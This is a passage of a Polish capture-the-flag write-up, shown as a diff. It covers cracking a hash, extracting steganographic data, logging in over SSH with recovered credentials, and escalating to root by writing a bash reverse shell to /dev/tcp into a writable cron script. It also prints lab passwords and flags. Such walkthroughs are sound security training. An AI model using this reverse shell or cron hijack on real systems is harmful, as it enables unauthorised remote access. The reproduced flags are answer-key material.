@@ -143,7 +143,82 @@ Dekodujemy ciąg znaków przy pomocy [CyberChef'a](https://gchq.github.io/CyberC
 /n0th1ng3ls3m4tt3r
 ```
 
-Przechodzimy do ukrytej lokalizacji, która zawiera zdjęcie:
+Przechodzimy do ukrytej lokalizacji, która zawiera dwa zdjęcia:
 
 ![Photo](img/Photo.JPG)
 
+W źródle strony znowu znajdujemy ciąg znaków przypominających hash:
+
+![Hash](img/Hash.JPG)
+
+Korzystamy z [dekodera online](https://md5hashing.net/), aby złamać hash'a w formacie GOST. Otrzymujemy hasło:
+
+![Pass](img/Pass.JPG)
+
+```
+mypasswordforthatjob
+```
+
+Pobieramy zdjęcia i za pomocą narzędzia steghide, wydobywamy ukryte informacje przy użyciu zdobytego hasła:
+
+![Steg](img/Steg.JPG)
+
+```
+steghide --extract -sf binarycodepixabay.jpg 
+```
+
+Korzystając z [CyberChef'a](https://gchq.github.io/CyberChef/) dekodujemy hasło do serwisu SSH:
+
+![Binary](img/Binary.JPG)
+
+```
+iconvertedmypasswordtobinary
+```
+
+### Port 6498
+
+Logujemy się do serwisu SSH przy pomocy zdobytych danych:
+
+```
+boring:iconvertedmypasswordtobinary
+```
+
+W katalogu domowym użytkownika boring znajdujemy czwartą flagę, którą dekoduejmy przy użyciu [CyberChef'a](https://gchq.github.io/CyberChef/):
+
+![Flag4](img/Flag4.JPG)
+
+```
+synt{a0jvgf33zfa0ez4y}
+```
+
+![ROT13](img/ROT13.JPG)
+
+```
+flag{n0wits33msn0rm4l}
+```
+
+Przechodzimy do katalogu /var/www, w którym znajduje się plik .mysecretcronjob.sh:
+
+![Cron](img/Cron.JPG)
+
+Plik został stworzony przez użytkownika boring, zatem możemy go edytować przy pomocy komendy nano ustawiając reverse shell'a:
+
+![Nano](img/Nano.JPG)
+
+```
+bash -i >& /dev/tcp/[IP]/[PORT] 0>&1
+```
+
+Ustawiamy nasłuchiwanie na wybranym porcie i po chwili uzyskujemy dostęp do serwera jako użytkownik root:
+
+![Root](img/Root.JPG)
+
+W katalogu domowym użytkownika root znajdujemy piątą flagę:
+
+![Flag5](img/Flag5.JPG)
+
+```
+flag{63a9f0ea7bb98050796b649e85481845}
+```
+
+Do zobaczenia na kolejnych CTF-ach!
